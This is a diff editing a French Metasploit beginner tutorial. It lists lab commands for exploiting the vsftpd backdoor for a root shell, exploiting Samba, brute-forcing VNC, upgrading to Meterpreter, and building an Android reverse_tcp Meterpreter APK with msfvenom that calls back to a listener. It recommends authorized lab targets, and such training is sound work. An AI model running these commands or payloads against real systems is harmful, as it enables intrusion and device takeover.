@@ -254,43 +254,78 @@ whoami
 ### Exemples Pratiques Détaillés
 ## Voici un tableau récapitulatif d’exemples pratiques :
 Exemple
+
 Module/Commande
+
 Configuration
+
 Résultat Attendu
+
 Exploiter vsftpd
+
 use exploit/unix/ftp/vsftpd_234_backdoor
+
 set RHOSTS 192.168.74.129, exploit
+
 Shell root, whoami retourne root
+
 Scanner Samba et exploiter
+
 use auxiliary/scanner/smb/smb_version, puis use 1
+
 set RHOSTS 192.168.74.129, exploit
-Détecte Samba 3.0.20, accès root
+
+### Détecte Samba 3.0.20, accès root
+
 Brute force VNC
+
 use auxiliary/scanner/vnc/vnc_login
+
 set RHOSTS 192.168.74.129, run
-Trouve mot de passe ("password"), accès GUI
+
+
+### Trouve mot de passe ("password"), accès GUI
 Upgrader à Meterpreter
+
 use post/multi/manage/shell_to_meterpreter
+
 set SESSION 4, exploit
-Session Meterpreter, accès avancé
+
+### Session Meterpreter, accès avancé
 Créer payload Android
+
 msfvenom -p android/meterpreter/reverse_tcp ...
+
 LHOST=192.168.74.128, LPORT=8080, -o payload.apk
+
 Fichier APK généré, 13625 bytes
+
 Création de Payloads Personnalisés
+
 Avec msfvenom, vous pouvez générer des payloads pour différents systèmes. Par exemple, pour Android :
+
 bash
+
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.74.128 LPORT=8080 -o /root/Desktop/payload.apk
+
 Configurez un handler avec :
+
 bash
+
 use exploit/multi/handler
+
 set payload android/meterpreter/reverse_tcp
+
 run
-Cela permet de tester des applications mobiles, une fonctionnalité inattendue pour ceux qui se concentrent uniquement sur les réseaux.
+
+###Cela permet de tester des applications mobiles, une fonctionnalité inattendue pour ceux qui se concentrent uniquement sur les réseaux.
 Conseils et Précautions
+
 Pratiquer sur des systèmes autorisés est crucial. Utilisez Metasploitable, téléchargeable sur Rapid7.
-Ne testez jamais sur des systèmes sans permission, car cela peut être illégal.
-Explorez les ressources supplémentaires comme HackTheBox pour des modules de formation, ou StationX pour des guides détaillés.
+
+# Ne testez jamais sur des systèmes sans permission, car cela peut être illégal.
+
+### Explorez les ressources supplémentaires comme HackTheBox pour des modules de formation, ou StationX pour des guides détaillés.
 ## <span style="color: purple">Conclusion</span>
 Ce tutoriel couvre les bases et des exemples avancés de Metasploit, adaptés aux débutants. En suivant ces étapes, vous devriez être capable de comprendre comment rechercher, configurer, et exploiter des vulnérabilités, tout en explorant des fonctionnalités comme Meterpreter et msfvenom. 
 
